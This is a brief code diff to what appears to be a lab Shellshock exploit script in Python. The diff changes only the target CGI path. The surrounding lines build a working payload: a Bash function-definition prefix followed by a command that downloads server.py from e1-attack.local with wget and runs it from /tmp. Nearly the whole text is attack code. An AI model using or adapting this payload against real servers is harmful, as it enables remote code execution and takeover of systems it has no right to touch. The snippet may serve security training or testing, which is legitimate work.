@@ -3,7 +3,7 @@ import requests
 
 def send_shellshock_payload(target: str) -> None:
     """Send the Shellshock exploit payload to the target"""
-    url = f"http://{target}/cgi-bin/vulnerable.sh"
+    url = f"http://{target}/cgi-bin/shockme.cgi"
     command = "wget http://e1-attack.local:8080/server.py -O /tmp/server.py && python3 /tmp/server.py &"
     payload = f"() {{ :; }}; {command}"
 
